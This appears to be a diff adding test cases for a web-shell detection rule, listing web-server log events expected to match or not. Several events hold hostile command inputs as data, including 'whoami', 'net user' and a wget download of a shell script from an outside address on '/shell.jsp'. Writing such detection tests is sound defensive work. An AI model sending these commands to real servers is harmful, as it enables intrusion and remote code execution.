@@ -1,0 +1,19 @@
+cases:
+  - description: whoami through cmd parameter
+    expect: match
+    event: {cs-method: GET, cs-uri-stem: /uploads/image.php, cs-uri-query: "cmd=whoami", sc-status: 200}
+  - description: downloader via exec parameter
+    expect: match
+    event: {cs-method: GET, cs-uri-stem: /shell.jsp, cs-uri-query: "exec=wget%20http://198.51.100.9/x.sh", sc-status: 200}
+  - description: command chained after another parameter
+    expect: match
+    event: {cs-method: GET, cs-uri-stem: /admin/tools.aspx, cs-uri-query: "t=1&c=net+user", sc-status: 200}
+  - description: cmd parameter on a static file is not a script
+    expect: no_match
+    event: {cs-method: GET, cs-uri-stem: /help.html, cs-uri-query: "cmd=ls", sc-status: 200}
+  - description: word that only starts like a command
+    expect: no_match
+    event: {cs-method: GET, cs-uri-stem: /index.php, cs-uri-query: "cmd=identity-check", sc-status: 200}
+  - description: unrelated parameter name
+    expect: no_match
+    event: {cs-method: GET, cs-uri-stem: /index.php, cs-uri-query: "page=whoami", sc-status: 200}
